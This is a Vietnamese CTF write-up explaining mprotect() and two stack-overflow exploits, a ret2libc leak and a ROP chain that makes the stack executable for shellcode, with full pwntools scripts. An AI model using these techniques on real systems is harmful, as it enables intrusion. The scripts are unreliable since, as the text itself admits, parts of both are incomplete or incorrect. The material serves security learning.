### Hàm `mprotect` và Ứng dụng trong Khai thác Lỗ hổng
#### Giới thiệu về hàm `mprotect`
Hàm `mprotect` được dùng để thay đổi quyền truy cập của một vùng nhớ, cụ thể là thay đổi thuộc tính bảo vệ của vùng nhớ bắt đầu từ địa chỉ `start` với độ dài `len` thành giá trị được chỉ định bởi `prot`.
Khai báo (prototype) của hàm như sau:
``` C
#include <sys/mman.h>

int mprotect(void *addr, size_t len, int prot);
```
Tham số `prot` nhận các giá trị sau, có thể được kết hợp bằng toán tử `|` (tương đương với việc cộng các giá trị):
- `PROT_READ` (giá trị 1): Cho phép đọc vùng nhớ.
- `PROT_WRITE` (giá trị 2): Cho phép ghi vào vùng nhớ.
- `PROT_EXEC` (giá trị 4): Cho phép thực thi mã trong vùng nhớ.
- `PROT_NONE` (giá trị 0): Không cho phép truy cập.
**Lưu ý quan trọng:** Vùng nhớ được chỉ định phải bao trọn một trang nhớ (memory page). Điều này có nghĩa là địa chỉ `start` phải là địa chỉ bắt đầu của một trang nhớ, và độ dài `len` phải là bội số của kích thước trang nhớ (thường là 4KB).
Nếu thực thi thành công, hàm trả về `0`. Nếu thất bại, hàm trả về `-1` và gán mã lỗi cụ thể vào biến `errno`. Một số nguyên nhân lỗi thường gặp:
- `EACCES`: Vùng nhớ không thể được gán quyền truy cập tương ứng. Ví dụ, khi một file được ánh xạ vào bộ nhớ (`mmap`) với quyền chỉ đọc, bạn không thể dùng `mprotect()` để đổi thành `PROT_WRITE`.
- `EINVAL`: `start` không phải là một con trỏ hợp lệ hoặc không trỏ tới địa chỉ bắt đầu của một trang nhớ.
- `ENOMEM`: Kernel không thể cấp phát các cấu trúc dữ liệu nội bộ cần thiết.
- `ENOMEM`: Không gian địa chỉ của tiến trình trong khoảng `[start, start+len]` không hợp lệ, hoặc có một hay nhiều trang nhớ chưa được ánh xạ (unmapped).
Khi một tiến trình cố gắng truy cập bộ nhớ vi phạm các thuộc tính bảo vệ đã được thiết lập, kernel sẽ gửi tín hiệu `SIGSEGV` (lỗi phân đoạn bộ nhớ - Segmentation Fault) và chấm dứt tiến trình đó.
### Phân tích ví dụ thực tế

Các ví dụ sau được lấy từ cuộc thi An Toàn Mạng 2020. `pwn1` là một bài tập stack overflow cơ bản, trong khi `pwn2` nâng cao hơn khi kết hợp `mprotect` và là một chương trình được biên dịch tĩnh.

#### Ví dụ 1: `pwn1` - Lỗ hổng Stack Overflow kinh điển

Trước hết, hãy xem xét `pwn1`. Đây là một chương trình 64-bit được liên kết động (dynamically linked), có bật Partial RELRO và NX. ASLR ở cấp hệ điều hành cũng được kích hoạt.
[Link](https://github.com/firmianay/CTF-All-In-One/tree/master/src/others/4.11_mprotect)
``` Bash
$ file pwn1 
pwn1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, ... not stripped
$ pwn checksec pwn1
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Hàm `main()` của chương trình in ra một chuỗi chào mừng, sau đó gọi hàm `vul()` chứa lỗ hổng buffer overflow. Lệnh `read(0, &buf, 0x100uLL)` cho phép đọc tối đa `0x100` byte vào một buffer chỉ có kích thước `0x80` byte.

Code snippet
``` Assembly
; Hàm main
.text:000000000040059A call    _write
.text:000000000040059F call    vul
.text:00000000004005A4 mov     eax, 0
.text:00000000004005A9 pop     rbp
.text:00000000004005AA retn

; Hàm vul chứa lỗ hổng
.text:0000000000400566 public vul
.text:0000000000400566 buf= byte ptr -80h
...
.text:0000000000400572 mov     edx, 100h       ; nbytes = 0x100
.text:0000000000400577 mov     rsi, rax        ; buf (kích thước 0x80)
.text:000000000040057F call    _read
...
.text:0000000000400586 retn
```

**Hướng khai thác:** Sử dụng buffer overflow để kiểm soát địa chỉ trả về, sau đó thực thi một ROP chain để rò rỉ địa chỉ của hàm `write` trong libc. Từ đó, ta có thể tính toán địa chỉ base của libc và tìm địa chỉ của `one-gadget` để thực thi và lấy shell.
Script khai thác (`exp`) như sau:
``` Python 3
from pwn import *
context(os='linux', arch='amd64', log_level='debug')

io = process('./pwn1')
elf = ELF('./pwn1')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = 0x400613
pop_rsi_r15 = 0x400611
write_plt = elf.plt['write'] # Sửa lại để rõ ràng hơn
write_got = elf.got['write']
 
# Giai đoạn 1: Rò rỉ địa chỉ hàm write
payload = b"A"*0x88 
payload += p64(pop_rdi) + p64(1) # a1 = fd = 1 (stdout)
payload += p64(pop_rsi_r15) + p64(write_got) + p64(0) # a2 = buf, a3 = count
payload += p64(write_plt)
# Cần thêm một bước quay lại hàm main hoặc vul để có thể gửi payload thứ 2
# Giả sử quay lại main: payload += p64(elf.symbols['main']) 

io.sendlineafter(b'welcome~\n', payload)

write_addr = u64(io.recv(8))

# Giai đoạn 2: Tính toán và gọi one-gadget
libc_base = write_addr - libc.sym['write']
one_gadget = libc_base + 0x4527a # Offset này có thể thay đổi tùy phiên bản libc
payload = b"A"*0x88 + p64(one_gadget)

io.sendline(payload)
io.interactive()
```

_(Lưu ý: Script gốc có thể cần chỉnh sửa để ROP chain hoạt động hoàn chỉnh, ví dụ như thêm bước quay lại hàm `main` để gửi payload lần hai)._
#### Ví dụ 2: `pwn2` - Vượt qua NX bằng `mprotect`
`pwn2` là một chương trình 64-bit được biên dịch tĩnh (statically linked), có bật Partial RELRO và NX.
``` Shell
$ file pwn2 
pwn2: ELF 64-bit LSB executable, x86-64, ... statically linked, ... not stripped
$ pwn checksec pwn2 
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Do được biên dịch tĩnh, chương trình không phụ thuộc vào `libc` bên ngoài, khiến các kỹ thuật tấn công như `ret2libc` không còn hiệu quả. Hướng đi khả thi là tiêm và thực thi shellcode. Tuy nhiên, stack lại được bảo vệ bởi **NX (No-Execute)**. Đây chính là lúc `mprotect()` phát huy tác dụng.
Bằng cách phân tích file binary, chúng ta có thể tìm thấy một hàm nội bộ rất hữu ích là `_dl_make_stack_executable()`. Hàm này bên trong có gọi `mprotect` để cấp quyền thực thi cho stack.
``` C
// Mã giả của hàm _dl_make_stack_executable
unsigned int __fastcall dl_make_stack_executable(_QWORD *a1)
{
  // ...
  v3 = *a1 & -(signed __int64)dl_pagesize; // Căn chỉnh địa chỉ theo page size
  // ...
  result = mprotect(v3, dl_pagesize, (unsigned int)_stack_prot);
  // ...
  return result;
}
```

**Hướng khai thác:** Chúng ta sẽ xây dựng một ROP chain để gọi hàm `_dl_make_stack_executable` với các tham số phù hợp. Mục tiêu là:
1. Ghi giá trị `7` (`PROT_READ | PROT_WRITE | PROT_EXEC`) vào biến toàn cục `_stack_prot`.
```C
#define PROT_NONE  0x0
#define PROT_READ  0x1   // quyền đọc
#define PROT_WRITE 0x2   // quyền ghi
#define PROT_EXEC  0x4   // quyền thực thi
```
	PROT_READ | PROT_WRITE | PROT_EXEC
	= 0x1 | 0x2 | 0x4
	= 0x7
1. Truyền địa chỉ của biến toàn cục `__libc_stack_end` vào thanh ghi `rdi` (đây là tham số đầu tiên của hàm).
2. Gọi hàm `_dl_make_stack_executable()`.
3. Sau khi stack đã có quyền thực thi, quay trở lại hàm `vul` để đọc shellcode và thực thi nó.
ROP chain trông như sau trong bộ nhớ stack:
``` shell
...
0x7ffef00bbb18:	0x00000000004015e7  # pop rsi ; ret
0x7ffef00bbb20:	0x0000000000000007      # rwx -> giá trị 7
0x7ffef00bbb28:	0x00000000004014c6  # pop rdi ; ret
0x7ffef00bbb30:	0x00000000006c9fe0      # Địa chỉ của _stack_prot
0x7ffef00bbb38:	0x000000000047a3b2  # mov [rdi], rsi ; ret -> ghi 7 vào _stack_prot
0x7ffef00bbb40:	0x00000000004014c6  # pop rdi ; ret
0x7ffef00bbb48:	0x00000000006c9f90      # Địa chỉ của __libc_stack_end
0x7ffef00bbb50:	0x0000000000474730      # Gọi hàm _dl_make_stack_executable
0x7ffef00bbb58:	0x00000000004009e7      # Quay lại hàm vul
```
**Kiểm chứng bằng Debugger**
Trước khi gọi `mprotect`:
``` Shell
gef➤  vmmap 
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
...
0x00007ffef009d000 0x00007ffef00be000 0x0000000000000000 rw- [stack]
...
```
Stack (`[stack]`) chỉ có quyền đọc/ghi (`rw-`).
Sau khi gọi `mprotect` thành công, một phần của stack đã có quyền thực thi (`rwx`):
``` Shell
gef➤  vmmap 
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
...
0x00007ffef009d000 0x00007ffef00bb000 0x0000000000000000 rw- 
0x00007ffef00bb000 0x00007ffef00bc000 0x0000000000000000 rwx [stack]
0x00007ffef00bc000 0x00007ffef00be000 0x0000000000000000 rw- 
...
```

Cuối cùng, chương trình nhảy về hàm `vul`, cho phép chúng ta gửi payload thứ hai chứa shellcode. Shellcode này sẽ được ghi lên vùng stack đã có quyền `rwx` và được thực thi, giúp ta có được shell.
Script khai thác hoàn chỉnh:
``` Python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')

io = process('./pwn2')
elf = ELF('./pwn2')

vul = 0x4009E7

# ROP gadgets tìm được trong binary
pop_rdi = 0x4014c6
pop_rsi = 0x4015e7
mov_ptr_rdi_rsi = 0x47a3b2 # mov [rdi], rsi ; ret

# Giai đoạn 1: Dùng ROP chain để gọi mprotect và làm cho stack thực thi được
payload  = b"A"*0x88
# Ghi giá trị 7 (rwx) vào biến __stack_prot
payload += p64(pop_rsi) + p64(7)
payload += p64(pop_rdi) + p64(elf.sym['__stack_prot'])
payload += p64(mov_ptr_rdi_rsi)
# Gọi hàm _dl_make_stack_executable với tham số là __libc_stack_end
payload += p64(pop_rdi) + p64(elf.sym['__libc_stack_end'])
payload += p64(elf.sym['_dl_make_stack_executable'])
# Quay lại hàm vul để đọc shellcode
payload += p64(vul)

io.sendlineafter(b'welcome~\n', payload)

# Giai đoạn 2: Gửi shellcode
# Cần tìm một gadget như `jmp rsp` hoặc tương tự để nhảy vào shellcode
# Giả sử đã có địa chỉ stack hoặc một gadget phù hợp
# Ở đây dùng một gadget `jmp rsi` và đặt địa chỉ stack vào `rsi`
# Tuy nhiên, script gốc có một chút không chính xác, ta sẽ giả định RSP trỏ tới shellcode

shellcode = asm(shellcraft.sh())
# Payload này sẽ ghi đè lên địa chỉ trả về bằng chính địa chỉ của buffer trên stack
payload2 = shellcode.ljust(0x88, b"A") + p64(0x4009e7 + 0x10) # Giả định địa chỉ buffer

io.sendline(payload2)
io.interactive()
```

_(Lưu ý: Phần payload thứ hai trong script gốc có thể cần điều chỉnh để con trỏ lệnh (RIP) nhảy chính xác vào vùng chứa shellcode trên stack)._'

References:
[CTF-All-In-One](https://firmianay.gitbook.io/ctf-all-in-one/4_tips/4.11_mprotect#li-ti)
